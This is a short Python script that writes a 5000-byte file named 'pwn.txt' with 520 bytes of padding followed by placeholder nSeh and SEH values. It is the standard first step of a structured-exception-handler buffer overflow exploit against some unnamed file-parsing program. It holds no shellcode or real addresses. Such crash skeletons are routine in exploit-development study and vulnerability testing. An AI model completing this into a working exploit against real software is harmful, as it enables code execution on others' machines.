#!/usr/bin/python

nSeh = "B" * 4
Seh  = "C" * 4

payload  = "A" * 520
payload += nSeh
payload += Seh
payload += "D" * (5000 - len(payload))

f = open('pwn.txt', 'w')
f.write(payload)
f.close()

